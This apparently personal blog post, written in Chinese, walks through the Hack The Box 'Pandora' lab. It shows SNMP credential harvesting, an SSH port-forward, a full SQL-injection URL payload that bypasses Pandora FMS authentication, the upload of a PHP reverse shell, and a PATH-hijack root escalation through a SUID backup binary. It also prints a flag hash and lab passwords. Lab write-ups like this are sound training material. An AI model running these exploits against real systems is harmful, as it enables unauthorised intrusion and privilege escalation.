---
title: 记模拟渗透-HTB-Pandora
published: 2022-04-09
description: "Hack The Box Pandora Writeup."
# image: "./cover.webp"
tags: ["网络安全","Hack The Box", "靶场"]
category: 网络安全
draft: false
---

记录时间<br />2022年4月8日中午之前

msf6 > db_nmap -A -sV 10.10.11.136 

[*] Nmap: Starting Nmap 7.92 ( [https://nmap.org](https://nmap.org) ) at 2022-04-06 05:30 EDT<br />[*] Nmap: Nmap scan report for 10.10.11.136 (10.10.11.136)<br />[*] Nmap: Host is up (0.36s latency).<br />[*] Nmap: Not shown: 997 closed tcp ports (reset)<br />[*] Nmap: PORT     STATE    SERVICE VERSION<br />[*] Nmap: 22/tcp   open     ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)<br />[*] Nmap: | ssh-hostkey:<br />[*] Nmap: |   3072 24:c2:95:a5:c3:0b:3f:f3:17:3c:68:d7:af:2b:53:38 (RSA)<br />[*] Nmap: |   256 b1:41:77:99:46:9a:6c:5d:d2:98:2f:c0:32:9a:ce:03 (ECDSA)<br />[*] Nmap: |_  256 e7:36:43:3b:a9:47:8a:19:01:58:b2:bc:89:f6:51:08 (ED25519)<br />[*] Nmap: 80/tcp   open     http    Apache httpd 2.4.41 ((Ubuntu))<br />[*] Nmap: |_http-title: Play | Landing<br />[*] Nmap: |_http-server-header: Apache/2.4.41 (Ubuntu)<br />[*] Nmap: 6543/tcp filtered mythtv<br />[*] Nmap: Aggressive OS guesses: Linux 5.4 (95%), Linux 3.1 (95%), Linux 3.2 (95%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (94%), ASUS RT-N56U WAP (Linux 3.4) (93%), Linux 3.16 (93%), Linux 4.15 - 5.6 (93%), Adtran 424RG FTTH gateway (92%), Linux 3.10 (92%), Linux 5.3 - 5.4 (92%)<br />[*] Nmap: No exact OS matches for host (test conditions non-ideal).<br />[*] Nmap: Network Distance: 2 hops<br />[*] Nmap: Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel<br />[*] Nmap: TRACEROUTE (using port 8080/tcp)<br />[*] Nmap: HOP RTT       ADDRESS<br />[*] Nmap: 1   360.68 ms 10.10.14.1 (10.10.14.1)<br />[*] Nmap: 2   360.74 ms 10.10.11.136 (10.10.11.136)<br />[*] Nmap: OS and Service detection performed. Please report any incorrect results at [https://nmap.org/submit/](https://nmap.org/submit/) .<br />[*] Nmap: Nmap done: 1 IP address (1 host up) scanned in 83.95 seconds

看看网页里有啥，好像没东西<br />![image.png](https://cdn.nlark.com/yuque/0/2022/png/1295434/1649238097733-c792c717-784b-4e0b-a6b3-578d71249ee9.png#averageHue=%233151b7&clientId=ue3f2227a-a88b-4&from=paste&height=895&id=u3c897e21&originHeight=895&originWidth=1653&originalType=binary&ratio=1&rotation=0&showTitle=false&size=244057&status=done&style=none&taskId=u95ad9632-9706-4d00-b034-5dbf080f064&title=&width=1653)

切换一个思路，看看有没有子域名，结果也是落空<br />wfuzz -c -u "[http://pandora.htb"](http://pandora.htb") -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt --hh 33560 -H "HOST:FUZZ.pandora.htb"

ssh端口不知道密码，先不去用<br />现在好像没啥可利用的 (信息收集！ 重中之重)<br />注意到刚才nmap扫描的是Tcp服务<br />看看UDP服务呢

**nmap -sV -sC -A -sU -oN udp_result -top-ports=20 pandora.htb**<br />[*] exec: nmap -sV -sC -A -sU -oN udp_result -top-ports=20 pandora.htb

Starting Nmap 7.92 ( [https://nmap.org](https://nmap.org) ) at 2022-04-06 05:53 EDT<br />Nmap scan report for pandora.htb (10.10.11.136)<br />Host is up (0.36s latency).

Bug in snmp-win32-software: no string output.<br />PORT      STATE  SERVICE      VERSION<br />53/udp    closed domain<br />67/udp    closed dhcps<br />68/udp    closed dhcpc<br />69/udp    closed tftp<br />123/udp   closed ntp<br />135/udp   closed msrpc<br />137/udp   closed netbios-ns<br />138/udp   closed netbios-dgm<br />139/udp   closed netbios-ssn<br />161/udp   open   snmp         SNMPv1 server; net-snmp SNMPv3 server (public)<br />| snmp-info: <br />|   enterprise: net-snmp<br />|   engineIDFormat: unknown<br />|   engineIDData: 48fa95537765c36000000000<br />|   snmpEngineBoots: 30<br />|_  snmpEngineTime: 4h48m20s<br />| snmp-sysdescr: Linux pandora 5.4.0-91-generic #102-Ubuntu SMP Fri Nov 5 16:31:28 UTC 2021 x86_64<br />|_  System uptime: 4h48m20.46s (1730046 timeticks)<br />| snmp-netstat: <br />|   TCP  0.0.0.0:22           0.0.0.0:0<br />|   TCP  10.10.11.136:22      10.10.14.28:56630<br />|   TCP  10.10.11.136:22      10.10.14.32:51682<br />|   TCP  10.10.11.136:35302   1.1.1.1:53<br />|   TCP  127.0.0.1:3306       0.0.0.0:0<br />|   TCP  127.0.0.1:6010       0.0.0.0:0<br />|   UDP  0.0.0.0:161          *:*<br />|_  UDP  127.0.0.53:53        *:*<br />| snmp-processes: <br />|   1: <br />|   2: <br />|   3: <br />|   4: <br />|   6: <br />|   9: <br />|   10: <br />|   11: <br />|   12: <br />|   13: <br />|   14: <br />|   15: <br />|   16: <br />|_  17: <br />162/udp   closed snmptrap<br />445/udp   closed microsoft-ds<br />500/udp   closed isakmp<br />514/udp   closed syslog<br />520/udp   closed route<br />631/udp   closed ipp<br />1434/udp  closed ms-sql-m<br />1900/udp  closed upnp<br />4500/udp  closed nat-t-ike<br />49152/udp closed unknown<br />Too many fingerprints match this host to give specific OS details<br />Network Distance: 2 hops<br />Service Info: Host: pandora

TRACEROUTE (using port 80/tcp)<br />HOP RTT       ADDRESS<br />1   359.51 ms 10.10.14.1 (10.10.14.1)<br />2   359.76 ms pandora.htb (10.10.11.136)

OS and Service detection performed. Please report any incorrect results at [https://nmap.org/submit/](https://nmap.org/submit/) .<br />Nmap done: 1 IP address (1 host up) scanned in 35.72 seconds

注意到161端口开着个snmp<br />![image.png](https://cdn.nlark.com/yuque/0/2022/png/1295434/1649239045581-4a9cebf3-cb29-4594-8059-2b880291f4fd.png#averageHue=%23242832&clientId=ue3f2227a-a88b-4&from=paste&height=442&id=uf5e03269&originHeight=442&originWidth=825&originalType=binary&ratio=1&rotation=0&showTitle=false&size=102587&status=done&style=none&taskId=u7f14e3be-1747-4fbc-8421-1bd4ed53441&title=&width=825)

kali里有个snmpwalk工具<br />~~snmpwalk -v 2c pandora.htb -c public > pandora.snmp (不管用。。)~~

snmpwalk 10.10.11.136 -c public -v 2c (管用)

在这里看到个账号密码<br />可能是ssh的，连上试试<br />iso.3.6.1.2.1.25.4.2.1.5.842 = STRING: "-c sleep 30; /bin/bash -c '/usr/bin/host_check -u daniel -p HotelBabylon23'"<br />![image.png](https://cdn.nlark.com/yuque/0/2022/png/1295434/1649392032085-3d994081-1771-47d8-ab1c-3e1a7560aad8.png#averageHue=%23232833&clientId=u283e9d69-c4a8-4&from=paste&id=uf70a139e&originHeight=209&originWidth=1073&originalType=binary&ratio=1&rotation=0&showTitle=false&size=178526&status=done&style=none&taskId=u9d37be02-518c-4137-89ff-8b2f96b2456&title=)<br />ssh daniel@10.10.11.136<br />password：<br />HotelBabylon23<br />![image.png](https://cdn.nlark.com/yuque/0/2022/png/1295434/1649392229446-0e81a684-bb1f-4a80-8834-93ca9656cb0c.png#averageHue=%23242731&clientId=u283e9d69-c4a8-4&from=paste&height=676&id=uab3679cb&originHeight=676&originWidth=1031&originalType=binary&ratio=1&rotation=0&showTitle=false&size=232576&status=done&style=none&taskId=ufe91152f-2444-4dc8-8b70-6679be28db9&title=&width=1031)

查看对应的端口服务时，发现本地运行了一个web服务<br />netstat -putlen<br />![image.png](https://cdn.nlark.com/yuque/0/2022/png/1295434/1649393884802-0c8d3491-a093-4bfe-9408-785b9a127129.png#averageHue=%23242832&clientId=u1770b29c-9811-4&from=paste&height=272&id=ue0f298c3&originHeight=272&originWidth=1074&originalType=binary&ratio=1&rotation=0&showTitle=false&size=74391&status=done&style=none&taskId=u2f2cc784-8ca1-4cf4-ba2f-e32e6e30a34&title=&width=1074)<br />curl pandora.htb<br />![image.png](https://cdn.nlark.com/yuque/0/2022/png/1295434/1649394893366-7bf7a965-72bc-46b2-bd23-4407a4f62a09.png#averageHue=%23222731&clientId=u1770b29c-9811-4&from=paste&height=70&id=u446afe02&originHeight=70&originWidth=645&originalType=binary&ratio=1&rotation=0&showTitle=false&size=11613&status=done&style=none&taskId=u8b17c3ec-84c5-4a56-8fa2-1816206f426&title=&width=645)

那么思路来了，我们可以利用端口转发技术，将目标机器的80端口转发到本机的80端口上进行访问。

ssh -L 80:127.0.0.1:80 daniel@pandora.htb<br />ssh -L 127.0.0.1:80:127.0.0.1:80 daniel@10.10.11.136<br />(上面两个都一样，用哪个都行)


![image.png](https://cdn.nlark.com/yuque/0/2022/png/1295434/1649401400752-bf9e9b5a-1f41-487a-95fa-e9cf7094b4a5.png#averageHue=%23222630&clientId=u1770b29c-9811-4&from=paste&height=871&id=u84a25e00&originHeight=871&originWidth=1049&originalType=binary&ratio=1&rotation=0&showTitle=false&size=403403&status=done&style=none&taskId=ufb39f8a2-8458-4846-afca-28afc28f0bf&title=&width=1049)

访问<br />[http://127.0.0.1/pandora_console/](http://127.0.0.1/pandora_console/)<br />![image.png](https://cdn.nlark.com/yuque/0/2022/png/1295434/1649404119625-e268e63e-62e4-43f6-8402-ee4a613d9c2d.png#averageHue=%23454e22&clientId=u1770b29c-9811-4&from=paste&height=901&id=u26a54249&originHeight=901&originWidth=1132&originalType=binary&ratio=1&rotation=0&showTitle=false&size=651206&status=done&style=none&taskId=u8e616f02-6d9f-464d-aac9-690cdccfc10&title=&width=1132)<br />v7.0NG.742_FIX_PERL2020<br />看见这么个网页 带版本和名字 那必然google 看到一个cve<br />[https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-5844](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-5844)

[https://nvd.nist.gov/vuln/detail/CVE-2020-26518#range-6019001](https://nvd.nist.gov/vuln/detail/CVE-2020-26518#range-6019001)


找到了一个sql注入，咱们去注入吧

sqlmap -u "http://127.0.0.1/pandora_console/include/chart_generator.php?session_id=1" --batch --dbms=mysql -D pandora -T tsessions_php -C id_session,data --dump<br />![image.png](https://cdn.nlark.com/yuque/0/2022/png/1295434/1649404843457-3ae74f9f-cb32-4292-8789-4d8bdbb9580f.png#averageHue=%23262a34&clientId=u1770b29c-9811-4&from=paste&height=851&id=u9d150ddf&originHeight=851&originWidth=1053&originalType=binary&ratio=1&rotation=0&showTitle=false&size=354422&status=done&style=none&taskId=u12b3121c-9ee7-470d-8b33-31079b53aa9&title=&width=1053)

这里检测到了get注入<br />![image.png](https://cdn.nlark.com/yuque/0/2022/png/1295434/1649405039727-1ffd1d75-8bb0-4d46-9939-2c85fd6e62a0.png#averageHue=%23282c37&clientId=u1770b29c-9811-4&from=paste&height=837&id=uebc72dee&originHeight=837&originWidth=1048&originalType=binary&ratio=1&rotation=0&showTitle=false&size=465159&status=done&style=none&taskId=u427d097e-3197-4de5-98d9-dacaab69228&title=&width=1048)

这里看到信息：<br />matt<br />![image.png](https://cdn.nlark.com/yuque/0/2022/png/1295434/1649405210709-bfac44ce-65aa-4367-b459-cf8f2e9082c4.png#averageHue=%23262a34&clientId=u1770b29c-9811-4&from=paste&height=888&id=u53bb667d&originHeight=888&originWidth=1333&originalType=binary&ratio=1&rotation=0&showTitle=false&size=529152&status=done&style=none&taskId=u448e6ef6-17f3-49ca-a56a-e3a24bafb0d&title=&width=1333)

sqlmap -u "http://127.0.0.1/pandora_console/include/chart_generator.php?session_id=1" --batch --dbms=mysql -D pandora -T tpassword_history -C id_pass,id_user,data_end,password,data_begin --dump<br />![image.png](https://cdn.nlark.com/yuque/0/2022/png/1295434/1649405270615-845a71db-ae7b-4af1-aa15-78cf815518d3.png#averageHue=%23272a34&clientId=u1770b29c-9811-4&from=paste&height=831&id=u228ffe23&originHeight=831&originWidth=1048&originalType=binary&ratio=1&rotation=0&showTitle=false&size=353424&status=done&style=none&taskId=u25c979ba-a7a2-4459-92b0-5cef58194f8&title=&width=1048)<br />首先使用如下poc进行跳过<br />http://127.0.0.1/pandora_console/include/chart_generator.php?session_id=%27%20union%20SELECT%201,2,%27id_usuario|s:5:%22admin%22;%27%20as%20data%20--%20SgGO 

然后直接访问[http://127.0.0.1/pandora_console/](https://link.zhihu.com/?target=http%3A//127.0.0.1/pandora_console/)即可以admin权限进行登录<br />![image.png](https://cdn.nlark.com/yuque/0/2022/png/1295434/1649405398662-aaf51239-79c6-456f-9832-c22a5b2876b7.png#averageHue=%239cb651&clientId=u1770b29c-9811-4&from=paste&height=892&id=u3c53d3f6&originHeight=892&originWidth=1341&originalType=binary&ratio=1&rotation=0&showTitle=false&size=238453&status=done&style=none&taskId=u0928fc19-79d7-4ba3-b7ce-cf71f14bc3e&title=&width=1341)<br />![image.png](https://cdn.nlark.com/yuque/0/2022/png/1295434/1649405480883-ab1e3d51-998b-4be7-bcfd-85f0ff192a62.png#averageHue=%2399c15a&clientId=u1770b29c-9811-4&from=paste&height=919&id=u0613cb6e&originHeight=919&originWidth=1906&originalType=binary&ratio=1&rotation=0&showTitle=false&size=528459&status=done&style=none&taskId=ue0f7feef-0962-4d49-8a75-971f471111b&title=&width=1906)

[https://link.zhihu.com/?target=https%3A//github.com/pentestmonkey/php-reverse-shell](https://link.zhihu.com/?target=https%3A//github.com/pentestmonkey/php-reverse-shell)<br />使用该shell，先保存到本地然后稍微修改一下<br />修改<br />$ip<br />$port<br />![image.png](https://cdn.nlark.com/yuque/0/2022/png/1295434/1649405705168-d68c8026-18f6-4038-930f-382e13fcd636.png#averageHue=%231f1f1e&clientId=u1770b29c-9811-4&from=paste&height=327&id=u7bb2e6c6&originHeight=327&originWidth=550&originalType=binary&ratio=1&rotation=0&showTitle=false&size=23256&status=done&style=none&taskId=u3f4b17d4-8390-4ff5-a239-383ccb305a3&title=&width=550)

![image.png](https://cdn.nlark.com/yuque/0/2022/png/1295434/1649405857359-c27ad5d7-4f60-4b33-a323-abaa2c1240a8.png#averageHue=%23cbcaca&clientId=u1770b29c-9811-4&from=paste&height=679&id=ud516ef21&originHeight=679&originWidth=1240&originalType=binary&ratio=1&rotation=0&showTitle=false&size=133489&status=done&style=none&taskId=u58d47f65-eceb-458f-a73f-0eeb3760e55&title=&width=1240)<br />传上去后在   [http://127.0.0.1/pandora_console/images/php-reverse-shell.php](https://link.zhihu.com/?target=http%3A//127.0.0.1/pandora_console/images/phpshell.php)  可以找到shell

![image.png](https://cdn.nlark.com/yuque/0/2022/png/1295434/1649406150872-f72e006f-6183-4a6a-94aa-a355f1884d37.png#averageHue=%232a2b35&clientId=u1770b29c-9811-4&from=paste&height=773&id=uc4cd91cd&originHeight=773&originWidth=1611&originalType=binary&ratio=1&rotation=0&showTitle=false&size=328137&status=done&style=none&taskId=ud76304db-7db2-4732-9878-8c6380f5111&title=&width=1611)

这里监听4444，就是文件中自己设置的端口<br />![image.png](https://cdn.nlark.com/yuque/0/2022/png/1295434/1649406184271-4251ed76-20cc-4e6f-b001-47d454079199.png#averageHue=%23252833&clientId=u1770b29c-9811-4&from=paste&height=327&id=u9dd8d384&originHeight=327&originWidth=698&originalType=binary&ratio=1&rotation=0&showTitle=false&size=94754&status=done&style=none&taskId=u1f49caf9-e0d1-49be-b3f6-2f6cfb117d3&title=&width=698)<br />python3 -c "import pty;pty.spawn('/bin/bash')"<br />利用python<br />打开个shell<br />![image.png](https://cdn.nlark.com/yuque/0/2022/png/1295434/1649406579668-7cdae4e3-0fa2-4e81-89d3-d80b1c58e736.png#averageHue=%23242732&clientId=u1770b29c-9811-4&from=paste&height=144&id=ub5bdaa03&originHeight=144&originWidth=726&originalType=binary&ratio=1&rotation=0&showTitle=false&size=34572&status=done&style=none&taskId=ufbd6a8e5-1d0c-43dc-9285-635f784c609&title=&width=726)

=================================================================

以下内容不公开<br />含有flag

<a name="pTHsy"></a>
### usr-flag
matt@pandora:/home/matt$ cat user.txt<br />cat user.txt<br />31877bbaf34fd1eef94ad5b501a83052<br />拿到user的flag

![image.png](https://cdn.nlark.com/yuque/0/2022/png/1295434/1649406661019-a803f85f-686c-4ca3-a7bc-14aac5160ef0.png#averageHue=%23242731&clientId=u1770b29c-9811-4&from=paste&height=629&id=u6bf23ebf&originHeight=629&originWidth=783&originalType=binary&ratio=1&rotation=0&showTitle=false&size=167067&status=done&style=none&taskId=ub9bf7a61-a6c8-4e4b-8e64-de6eb29e03c&title=&width=783)

然后就是提权到root了 现在很多事情都可以干了<br />find / -perm -u=s -type f 2>/dev/null <br />又看到了 /usr/bin/pkexec 但是这里用不了<br />看到一个很诡异的二进制文件 <br />/usr/bin/pandora_backup<br />下下来 strings pandora_backup看上一看<br />matt@pandora:/home/matt$ sudo /usr/bin/pandora_backup <br />sudo /usr/bin/pandora_backup <br />sudo: PERM_ROOT: setresuid(0, -1, -1): Operation not permitted <br />sudo: unable to initialize policy plugin<br />直接利用会错误，我们需要一个更加稳定的shell<br />![image.png](https://cdn.nlark.com/yuque/0/2022/png/1295434/1649406821765-1c77434c-1e16-465a-a47f-c5173d5aec0a.png#averageHue=%23242731&clientId=u1770b29c-9811-4&from=paste&height=640&id=u8895be98&originHeight=640&originWidth=798&originalType=binary&ratio=1&rotation=0&showTitle=false&size=177080&status=done&style=none&taskId=ua2a39644-e94b-44d3-a98e-586ba4e9200&title=&width=798)

The key fingerprint is:<br />SHA256:vV7w0pxT635at4mzFf9oWutXYx4tc4hxWqYEPUnA04o matt@pandora

这里生成ssh秘钥<br />![image.png](https://cdn.nlark.com/yuque/0/2022/png/1295434/1649408776684-d0862043-d7cb-4f5c-9827-bf45c3e9c8fc.png#averageHue=%23262934&clientId=u1770b29c-9811-4&from=paste&height=501&id=u8a9d7fa5&originHeight=501&originWidth=656&originalType=binary&ratio=1&rotation=0&showTitle=false&size=82114&status=done&style=none&taskId=uf5007964-ac06-450c-9470-bd8f875dab5&title=&width=656)

![image.png](https://cdn.nlark.com/yuque/0/2022/png/1295434/1649413101218-8924b382-8110-435a-af2b-f4c8be9ab56a.png#averageHue=%232c3442&clientId=u1770b29c-9811-4&from=paste&height=734&id=u6edb915a&originHeight=734&originWidth=629&originalType=binary&ratio=1&rotation=0&showTitle=false&size=317431&status=done&style=none&taskId=uc1ca426e-3254-4a6c-99d0-3fb39edfb29&title=&width=629)


在本地新建个id_rsa<br />把key复制进去<br />![image.png](https://cdn.nlark.com/yuque/0/2022/png/1295434/1649409540517-c53a115c-3986-4801-b19b-31ccf11d1cc0.png#averageHue=%23272b37&clientId=u1770b29c-9811-4&from=paste&height=843&id=ud06fb8dd&originHeight=843&originWidth=1049&originalType=binary&ratio=1&rotation=0&showTitle=false&size=564537&status=done&style=none&taskId=u3f1d07d8-9350-42fa-b898-99900cdf6e3&title=&width=1049)


这里输入刚才设置的passphrase:<br />123456789a<br />ssh matt@pandora.htb -i id_rsa<br />![image.png](https://cdn.nlark.com/yuque/0/2022/png/1295434/1649411316230-447be3d7-f2fe-48b9-a8b2-13e6f3c4fb96.png#averageHue=%23252731&clientId=u1770b29c-9811-4&from=paste&height=851&id=u97d5f69d&originHeight=851&originWidth=1071&originalType=binary&ratio=1&rotation=0&showTitle=false&size=392584&status=done&style=none&taskId=u8f8bbfac-f845-4ee1-b15f-539581d32ad&title=&width=1071)<br />![image.png](https://cdn.nlark.com/yuque/0/2022/png/1295434/1649411340296-d0d16960-0603-46cb-b47f-a49760c968c1.png#averageHue=%23242832&clientId=u1770b29c-9811-4&from=paste&height=116&id=u3d7ed113&originHeight=116&originWidth=499&originalType=binary&ratio=1&rotation=0&showTitle=false&size=11303&status=done&style=none&taskId=ubc1bd051-cc7a-4126-9aaf-12137f2d8d4&title=&width=499)

cd /home/matt/ <br />echo "/bin/bash" > tar <br />chmod +x tar <br />export PATH=/home/matt:$PATH

然后运行/usr/bin/pandora_backup文件

matt@pandora:~$ /usr/bin/pandora_backup <br />PandoraFMS Backup Utility <br />Now attempting to backup PandoraFMS client <br />root@pandora:~# whoami&&id <br />root <br />uid=0(root) gid=1000(matt) groups=1000(matt)

![image.png](https://cdn.nlark.com/yuque/0/2022/png/1295434/1649411490561-b12fe17d-5de4-4f47-ad26-87b7d57a47f2.png#averageHue=%23252832&clientId=u1770b29c-9811-4&from=paste&height=896&id=u5339b207&originHeight=896&originWidth=1916&originalType=binary&ratio=1&rotation=0&showTitle=false&size=665403&status=done&style=none&taskId=uc3ec8c1d-4a14-41b2-b19f-1c0760fb7b1&title=&width=1916)

=================================================================
<a name="DqpBY"></a>
### root-flag
~~root@pandora:/root# cat root.txt~~

![image.png](https://cdn.nlark.com/yuque/0/2022/png/1295434/1649411671748-f6c651dd-3c30-43eb-b22a-6fcea45eebe8.png#averageHue=%23192230&clientId=u1770b29c-9811-4&from=paste&height=801&id=u73f290f5&originHeight=801&originWidth=1508&originalType=binary&ratio=1&rotation=0&showTitle=false&size=242401&status=done&style=none&taskId=uc236ccc6-442b-478f-b2ac-7e9a00ffc66&title=&width=1508)

结束时间<br />2022年4月8日18:26:30
